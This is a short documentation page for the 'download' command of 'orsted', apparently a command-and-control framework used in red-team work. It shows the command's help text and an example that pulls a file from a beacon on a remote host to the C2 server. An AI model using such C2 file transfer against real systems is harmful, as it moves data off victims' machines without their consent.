---

title: download
description: orsted c2 download
---

### General

`download` allows you to download files.

```
[Session 9: haroun@DESKTOP-DU89UIV] » download --help

download file from beacon to the server

Usage:
  download [flags] remotefile localpath

Args:
  remotefile  string    remote file to download
  localpath   string    local destination on the server

Flags:
  -h, --help     display help
```

It requires you to load the `download` DLL with `load-module download`.

Example:

```powershell
[Session 9: haroun@DESKTOP-DU89UIV] » download regdump.py /tmp/r.py
```

This will download the remote file `regdump.py` to the `/tmp/r.py` of the `orsted-server` (not the `orsted-client`)
